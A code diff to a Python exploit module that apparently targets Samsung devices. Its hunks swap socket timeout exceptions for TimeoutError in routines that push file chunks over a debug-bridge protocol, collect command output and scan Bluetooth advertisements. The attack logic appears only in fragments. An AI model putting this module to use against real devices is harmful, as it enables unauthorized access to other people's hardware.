@@ -195,7 +195,7 @@ class Exploit(Exploit):
                 sock.sendall(write_header + data_hdr + chunk)
                 try:
                     sock.recv(24)
-                except socket.timeout:
+                except TimeoutError:
                     pass
                 sent += len(chunk)
 
@@ -210,7 +210,7 @@ class Exploit(Exploit):
             final = sock.recv(24 + 256)
             if b"OKAY" in final or b"STAT" in final:
                 return True
-        except socket.timeout:
+        except TimeoutError:
             pass
 
         return sent == file_size
@@ -242,7 +242,7 @@ class Exploit(Exploit):
                     sock.sendall(ack)
                 elif data[:4] == self._SDB_CLSE:
                     break
-        except socket.timeout:
+        except TimeoutError:
             pass
         return output.decode("utf-8", errors="replace").strip()
 
@@ -272,7 +272,7 @@ class Exploit(Exploit):
             while time.monotonic() < deadline:
                 try:
                     pkt = sock.recv(260)
-                except bt_socket.timeout:
+                except TimeoutError:
                     continue
                 dev = self._parse_samsung_adv(pkt)
                 if dev and dev.get("is_samsung"):
